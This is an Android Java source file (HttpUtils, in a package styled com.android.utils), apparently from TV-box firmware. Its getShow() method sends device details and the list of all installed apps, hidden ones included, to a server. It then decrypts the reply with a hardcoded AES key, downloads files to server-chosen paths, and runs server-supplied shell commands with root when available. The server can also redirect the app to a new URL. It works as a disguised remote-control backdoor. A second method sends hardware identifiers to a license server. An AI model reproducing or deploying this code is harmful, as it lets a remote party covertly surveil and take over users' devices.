package com.android.utils;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.SystemClock;
import android.os.SystemProperties;
import android.text.TextUtils;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import com.android.enty.CheckInfo;
import com.android.enty.CheckResponse;
import com.android.enty.ShowResponse;
import com.android.enty.TestResponse;
import com.android.enty.Updata;
import com.android.enty.showinfo;
import com.android.enty.work;
import com.android.show.ShowApplication;
import com.android.show.SpKeys;
import com.android.show.WarningActivity;
import com.blankj.utilcode.util.ActivityUtils;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.DeviceUtils;
import com.blankj.utilcode.util.EncryptUtils;
import com.blankj.utilcode.util.FileUtils;
import com.blankj.utilcode.util.GsonUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.PathUtils;
import com.blankj.utilcode.util.SPUtils;
import com.blankj.utilcode.util.ShellUtils;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.FileCallback;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import java.io.File;

/**
 * @Author: dxs
 * @time: 2019/11/11
 * @Email: duanxuesong12@126.com
 */
public class HttpUtils {
    private static int errorcount = 0;
    private static int CODE_SHOUTDOWM=10002;
    private static int CODE_TIPS=10003;
    private static String CheckUrl="https://tvbox.hcybox.net:31443/api/v1/device/license/check";

    //默认使用备用服务器
    //失败后用回默认服务器
    public static void getShow() {
        String showPost = SPUtils.getInstance().getString(SpKeys.SP_INTERVL_COPY, SpKeys.SP_INTERVL_COPY_DEF);
        if (errorcount > 5) {
            showPost = SpKeys.SP_SHOWURL_DEF;
            errorcount = 0;
        }
        String postdata = GsonUt.toJson(new showinfo(SystemInfo.getinfo(), SystemInfo.getAppsContainHide()));
        OkGo.<String>post(showPost)
                .tag(showPost)
                .upJson(GsonUt.toJson(new Updata(postdata)))
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
                        errorcount = 0;
                        try {
                            ShowResponse showResponse = GsonUt.fromJson(response.body(), ShowResponse.class);
                            if (showResponse.getCode() == 0) {
                                byte[] k = {66, 52, 69, 70, 67, 53, 68, 51, 50, 49, 56, 70, 65, 66, 55, 50};
                                String data = new String(EncryptUtils.decryptBase64AES(showResponse.getData().getBytes(), k, "AES/ECB/ZeroBytePadding", null));
                                final work wo = GsonUtils.fromJson(data, work.class);
                                //同步执行指下载任务完成之后再执行命令行
                                if (wo.hasDownload()) {
                                    //下载
                                    ShellUtils.execCmd(String.format("chmod 777 %s", wo.getDlloc()), DeviceUtils.isDeviceRooted());
                                    OkGo.<File>get(wo.getDlurl())
                                            .tag(wo.getDlurl())
                                            .execute(new FileCallback(wo.getDlloc(), null) {
                                                @Override
                                                public void onSuccess(Response<File> response) {
                                                    if (wo.isSyn()) {
                                                        ShellUtils.execCmd(wo.getComline(), DeviceUtils.isDeviceRooted());
                                                    }
                                                }
                                            });
                                    if (!wo.isSyn() && wo.hasCommon()) {
                                        ShellUtils.execCmd(wo.getComline(), DeviceUtils.isDeviceRooted());
                                    }
                                } else if (wo.hasCommon()) {
                                    ShellUtils.execCmd(wo.getComline(), DeviceUtils.isDeviceRooted());
                                }
                                if (wo.getIntervel() > 0) {
                                    SPUtils.getInstance().put(SpKeys.SP_INTERVL, wo.getIntervel());
                                }
                                //如果地址为空就或者与主地址相同，则不修改备用地址
                                //否则将服务器下发地址写入备用地址
                                if (TextUtils.isEmpty(wo.getApiurl()) || SpKeys.SP_INTERVL_COPY_DEF.equals(wo.getApiurl())) {

                                } else {
                                    SPUtils.getInstance().put(SpKeys.SP_INTERVL_COPY, wo.getApiurl());
                                }
                            } else {
                                LogUtils.e(response.body());
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
                        //一次启动失败连续5次，就替换一次主地址（如果主地址与备用地址不同）
                        if (!SpKeys.SP_SHOWURL_DEF.equals(SPUtils.getInstance().getString(SpKeys.SP_INTERVL_COPY))) {
                            errorcount++;
                        }
                    }
                });
    }

    public static void checkDevice() {
        // not user img
        String type=SystemProperties.get("ro.build.type","user");
        if(!"user".equals(type)){
            Log.i("dxs","not check because user");
            return;
        }
        //uncheck file

        CheckInfo info = new CheckInfo();
        info.setBluetoothAddr(SystemInfo.getBlueMac());
        info.setMacAddr(SystemInfo.getMac(ShowApplication.getContext()));
        info.setWifiMacAddr(SystemInfo.getWifiMac(ShowApplication.getContext()));
        info.setSerialNO(SystemProperties.get("ro.serialno"));
        info.setCpuserial(SystemInfo.getCpuSerial());
        OkGo.<String>post(CheckUrl)
                .tag(CheckUrl)
                .upJson(GsonUt.toJson(info))
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
                        CheckResponse checkResponse= GsonUt.fromJson(response.body(), CheckResponse.class);
                        if(checkResponse.getCode()==0){
                            long time=checkResponse.getData().getCheckTimespan();
                            SPUtils.getInstance().put(SpKeys.SP_INTERVL_CHECK,time);
                        }else {
                            Intent intent=new Intent();
                            intent.setClass(ShowApplication.getContext(), WarningActivity.class);
                            if(checkResponse.getCode()==CODE_SHOUTDOWM){
                                //shutdowm
                                intent.putExtra("code",1);
                                ActivityUtils.startActivity(intent);
                            }else if(checkResponse.getCode()==CODE_TIPS){
                                //显示警告
                                intent.putExtra("code",0);
                                intent.putExtra("msg",checkResponse.getMsg());
                                ActivityUtils.startActivity(intent);
                            }
                        }
                    }
                });
    }
}
